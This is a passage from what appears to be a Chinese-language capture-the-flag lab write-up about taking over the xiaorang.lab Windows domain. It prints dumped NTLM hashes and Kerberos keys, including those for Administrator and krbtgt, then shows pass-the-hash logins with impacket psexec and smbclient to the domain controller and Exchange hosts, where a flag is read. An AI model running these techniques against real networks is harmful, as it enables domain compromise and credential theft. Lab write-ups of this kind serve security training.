class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">SM_68af2c4169b54d459</span>:1133:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:31<span class="hljs-title">d6cfe0d16ae931b73c59d7e0c089c0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b</span>:1135:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:00<span class="hljs-title">d8a86839e3a99044a6bd793102dc31</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e</span>:1136:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:f6eef9918e591ca09c721976db49a5d4</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84</span>:1137:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:1<span class="hljs-title">e89e23e265bb7b54dc87938b1b1a131</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf</span>:1138:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:0<span class="hljs-title">eff3de35019c2ee10b68f48941ac50d</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292</span>:1139:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e434c7db0f0a09de83f3d7df25ec2d2f</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75</span>:1140:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:c43965ecaa92be22c918e2604e7fbea0</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b</span>:1141:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:4822<span class="hljs-title">b67394d6d93980f8e681c452be21</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542</span>:1142:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:147734<span class="hljs-title">fa059848c67553dc663782e899</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd</span>:1143:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:e7e4f69b43b92fb37d8e9b20848e6b66</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103</span>:1144:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:4<span class="hljs-title">fe68d094e3e797cfc4097e5cca772eb</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73</span>:1145:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:0<span class="hljs-title">c3d5e9fa0b8e7a830fcf5acaebe2102</span>:::</span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia</span>:1146:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:862976<span class="hljs-title">f8b23c13529c2fb1428e710296</span>:::</span><br><span class="hljs-function"><span class="hljs-title">Zhangtong</span>:1147:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:22<span class="hljs-title">c7f81993e96ac83ac2f3f1903de8b4</span>:::</span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:1000:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:9<span class="hljs-title">b7e332d6adcb4d62cae212d0c8038b8</span>:::</span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:1103:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee:bc2aaa56d33a9080b44fbe2d44b520b5</span>:::</span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:1104:<span class="hljs-title">aad3b435b51404eeaad3b435b51404ee</span>:6<span class="hljs-title">e136574f98f5d76aa1d5557e71b2edd</span>:::</span><br><span class="hljs-function">[*] <span class="hljs-title">Kerberos</span> <span class="hljs-title">keys</span> <span class="hljs-title">grabbed</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Administrator:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">d35b5e1dedca8060e674610041c5095c853724ca50c986c909a955b15fadf630</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Administrator:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:8<span class="hljs-title">b17084cfa8d1c1d37c13201d68ec0cf</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Administrator:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:d9c4a4d5348f0d73</span></span><br><span class="hljs-function"><span class="hljs-title">krbtgt:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:951<span class="hljs-title">d91f55df01d8e3013f433c695fd9684ac2f9f5c08fa815f751c894ca749f9</span></span><br><span class="hljs-function"><span class="hljs-title">krbtgt:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:7<span class="hljs-title">aa1c6c1f4080fdbf150cf5b6385c480</span></span><br><span class="hljs-function"><span class="hljs-title">krbtgt:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:700<span class="hljs-title">d434046231a9e</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">e34d601b6af9400b61602b8c9f71686f0393a97168db256adda27558816c4112</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:34<span class="hljs-title">f030ea99be5779376807998952ee81</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox8446c5b:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:4675<span class="hljs-title">ef8c15862329</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">dc5bb8f5cebfb09275e74f1fbb80a7eae044a064202a5b291aa09700909cabb5</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">fa2569ff74ac4ef0145b684535b9db26</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox0d5918e:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:b05ed989c78304fb</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:0<span class="hljs-title">dfb6bdfa6f3592f55baf1c228686597e00b1361eca1441a1fdf0c3599507fd7</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">f20b096f3ad270e4c36876fd0f1f4a09</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxeda7a84:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:3458<span class="hljs-title">ec32a815ce0b</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:801<span class="hljs-title">e2feead7ae5074578fad5eac0d3dabd92f0445068e0a69232ce5bd8ca76f4</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:3136<span class="hljs-title">e1be7138a8d29fa10bc3f2cf6f99</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox33b01cf:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:3283<span class="hljs-title">a2dc518680f7</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">f3aba1d52f3131e46d916fbd04817b43281b76b86b56dad24f808538e91363cc</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">ee9802236d43d7e5695190232c044d63</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox9570292:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:37<span class="hljs-title">d30719e940d679</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:721<span class="hljs-title">d8bcbbe316a0ec1a7f0aa3ce3519b4d7c3281a571e900b41384e5583d2c84</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:18353920<span class="hljs-title">e23e46ef0a834fe5cd5a481b</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox3479a75:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:8<span class="hljs-title">a3d2cf261386ba8</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">ff6aac30c110e42185c90561d0befebb0b462553737d05aec9c6dcb660612ffd</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:5117<span class="hljs-title">b1a04caa9925f508eeb0bd6ffa35</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox2d45c5b:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:df2ca48c1525dccb</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">a63a5cb34f7d503c61af2a96508ed826b0ad4daf10198f2b709b75bc58789e90</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">bfe7ece929174b6ba1d643e87f37cf7a</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxec2d542:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:5<span class="hljs-title">bf42601e608df31</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:824<span class="hljs-title">ea1eadc05dc8b0ed26c3ff0696c9e2fc145ad2d08dd5dbb1c6428f4eb074f</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">c62918a735c4fde6b5db99d9c441200c</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailboxf5f7dbd:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:46<span class="hljs-title">e654e5649d6732</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">c439db29ecbe032623449f1298a0537e6ed26c71dbd457574ac710c0e7c175e4</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">a952200f4f439c33c289f5a5408f902b</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox67dc103:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:751013<span class="hljs-title">ef3ee36225</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">a00af0ea0627c6497a806ebcd11c432f7c9658044ca4947438bfca3e371a8363</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">af5f9c02443cef462bb6b5456b296d60</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">HealthMailbox320fc73:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:1949<span class="hljs-title">dc2c7c98bc20</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:25<span class="hljs-title">e42c5502cfc032897686857062bba71a6b845a3005c467c9aeebf10d3fa850</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:1<span class="hljs-title">f95632f869be1726ff256888e961775</span></span><br><span class="hljs-function"><span class="hljs-title">xiaorang.lab</span>\<span class="hljs-title">Lumia:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:313<span class="hljs-title">db53e68ecf4ce</span></span><br><span class="hljs-function"><span class="hljs-title">Zhangtong:aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">ae16478a2d05fedf251d0050146d8d2e24608aa3d95f014acd5acb9eb8896bd5</span></span><br><span class="hljs-function"><span class="hljs-title">Zhangtong:aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:970<span class="hljs-title">b0820700dfa60e2c7c1af1d4bbdd1</span></span><br><span class="hljs-function"><span class="hljs-title">Zhangtong:des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:9<span class="hljs-title">b61b3583140c4b5</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:<span class="hljs-title">aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:168<span class="hljs-title">e6cf85d503904792474fe1ae9fe04b3706402ad0dad11f17039f92f6ed033</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:<span class="hljs-title">aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:434<span class="hljs-title">eda0e158169b3ec9cfc36eb0b56c8</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">WIN16</span>$:<span class="hljs-title">des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:fe457f9716d33b68</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:<span class="hljs-title">aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:76253835716<span class="hljs-title">e7b41cada5d7ef47e2503e3d9638be1b481878e8fc5db0ad7baa1</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:<span class="hljs-title">aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:<span class="hljs-title">c322f45c7e5a37bfc0feefbe09fafd65</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">EXC01</span>$:<span class="hljs-title">des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5</span>:6<span class="hljs-title">de546da467fbaf8</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:<span class="hljs-title">aes256</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:2<span class="hljs-title">b8247145b4d99664affb06d332f9a1ae55af8068e27d0b0deb11d0ace8353a9</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:<span class="hljs-title">aes128</span>-<span class="hljs-title">cts</span>-<span class="hljs-title">hmac</span>-<span class="hljs-title">sha1</span>-96:7304<span class="hljs-title">e348a7fbec88bb643d729bba3994</span></span><br><span class="hljs-function"><span class="hljs-title">XIAORANG</span>-<span class="hljs-title">PC</span>$:<span class="hljs-title">des</span>-<span class="hljs-title">cbc</span>-<span class="hljs-title">md5:a1452ca192fec767</span></span><br><span class="hljs-function">[*] <span class="hljs-title">Cleaning</span> <span class="hljs-title">up</span>...</span><br></code></pre></td></tr></table></figure><p>拿到域管 hash，接下来进行横向</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">xiaorang.lab\Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb:::<br></code></pre></td></tr></table></figure><p>psexec 登入域管拿下域控</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# proxychains -q impacket-psexec xiaorang.lab/Administrator@<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span> -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb -codec GBK<br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br>[*] Requesting shares on <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file NmVfoAWG.exe<br>[*] Opening SVCManager on <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.....<br>[*] Creating service Qcsg on <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span>.....<br>[*] Starting service Qcsg.....<br>[!] Press <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> extra shell commands<br>Microsoft Windows [版本 <span class="hljs-number">10</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14393</span>]<br>(c) <span class="hljs-number">2016</span> Microsoft Corporation。保留所有权利。<br><span class="hljs-function"></span><br><span class="hljs-function">C:\<span class="hljs-title">Windows</span>\<span class="hljs-title">system32</span>&gt; <span class="hljs-title">cd</span> <span class="hljs-title">C</span>:\<span class="hljs-title">users</span>\<span class="hljs-title">administrator</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>&gt; <span class="hljs-title">dir</span></span><br><span class="hljs-function"> 驱动器 <span class="hljs-title">C</span> 中的卷没有标签。</span><br><span class="hljs-function"> 卷的序列号是 0637-3<span class="hljs-title">CEF</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span> 的目录</span><br><span class="hljs-function"></span><br><span class="hljs-function">2022/10/23  21:34    &lt;<span class="hljs-title">DIR</span>&gt;          .</span><br><span class="hljs-function">2022/10/23  21:34    &lt;<span class="hljs-title">DIR</span>&gt;          ..</span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Contacts</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Desktop</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Documents</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Downloads</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Favorites</span></span><br><span class="hljs-function">2022/10/23  21:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">flag</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Links</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Music</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Pictures</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Saved</span> <span class="hljs-title">Games</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Searches</span></span><br><span class="hljs-function">2022/10/23  14:34    &lt;<span class="hljs-title">DIR</span>&gt;          <span class="hljs-title">Videos</span></span><br><span class="hljs-function">               0 个文件              0 字节</span><br><span class="hljs-function">              14 个目录 28,635,594,752 可用字节</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">C</span>:\<span class="hljs-title">Users</span>\<span class="hljs-title">Administrator</span>&gt; <span class="hljs-title">type</span> <span class="hljs-title">flag</span>\<span class="hljs-title">f</span>*</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">flag</span>\<span class="hljs-title">flag.txt</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">____</span>  <span class="hljs-title">___.___</span>   <span class="hljs-title">_____</span>   <span class="hljs-title">________</span> <span class="hljs-title">__________</span>    <span class="hljs-title">_____</span>    <span class="hljs-title">_______</span>    <span class="hljs-title">________</span></span><br><span class="hljs-function">\   \/  /|   | /  <span class="hljs-title">_</span>  \  \<span class="hljs-title">_____</span>  \\<span class="hljs-title">______</span>   \  /  <span class="hljs-title">_</span>  \   \      \  /  <span class="hljs-title">_____</span>/</span><br><span class="hljs-function"> \     / |   |/  /<span class="hljs-title">_</span>\  \  /   |   \|       <span class="hljs-title">_</span>/ /  /<span class="hljs-title">_</span>\  \  /   |   \/   \  <span class="hljs-title">___</span></span><br><span class="hljs-function"> /     \ |   /    |    \/    |    \    |   \/    |    \/    |    \    \<span class="hljs-title">_</span>\  \</span><br><span class="hljs-function">/<span class="hljs-title">___</span>/\  \|<span class="hljs-title">___</span>\<span class="hljs-title">____</span>|<span class="hljs-title">__</span>  /\<span class="hljs-title">_______</span>  /<span class="hljs-title">____</span>|<span class="hljs-title">_</span>  /\<span class="hljs-title">____</span>|<span class="hljs-title">__</span>  /\<span class="hljs-title">____</span>|<span class="hljs-title">__</span>  /\<span class="hljs-title">______</span>  /</span><br><span class="hljs-function">      \<span class="hljs-title">_</span>/            \/         \/       \/         \/         \/        \/</span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">flag04</span>: <span class="hljs-title">flag</span>&#123;411<span class="hljs-title">ce50b</span>-<span class="hljs-title">da03</span>-44<span class="hljs-title">e8</span>-95<span class="hljs-title">a3</span>-7058<span class="hljs-title">a3c711ca</span>&#125;</span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><h1 id="PTH-Exchange"><a href="#PTH-Exchange" class="headerlink" title="PTH Exchange"></a>PTH Exchange</h1><p>最后来看 DC 机器</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd">└─# proxychains -q impacket-smbclient -hashes :<span class="hljs-number">7</span>acbc09a6c0efd81bfa7d5a1d4238beb xiaorang.lab/administrator@<span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">26</span> -dc-ip <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">3</span>.<span class="hljs-number">2</span><br>Impacket v0.<span class="hljs-number">12</span>.<span class="hljs-number">0</span> - Copyright Fortra, LLC and its affiliated companies<br><br><span class="hljs-built_in">Type</span> <span class="hljs-built_in">help</span> <span class="hljs-keyword">for</span> list of commands<br># use C$<br># <span class="hljs-built_in">cd</span> /Users/Lumia/Desktop<br># ls<br>drw-rw-rw-          <span class="hljs-number">0</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">21</span>:<span class="hljs-number">40</span>:<span class="hljs-number">24</span> <span class="hljs-number">2022</span> .<br>drw-rw-rw-          <span class="hljs-number">0</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">22</span>:<span class="hljs-number">44</span> <span class="hljs-number">2022</span> ..<br>-rw-rw-rw-        <span class="hljs-number">282</span>  Sun Oct <span class="hljs-number">23</span> <span class="hljs-number">20</span>:<span class="hljs-number">22</span>:<span class="hljs-number">55</span> <span class="hljs-number">2022</span> desktop.ini<br>-rw-rw-rw-     <span 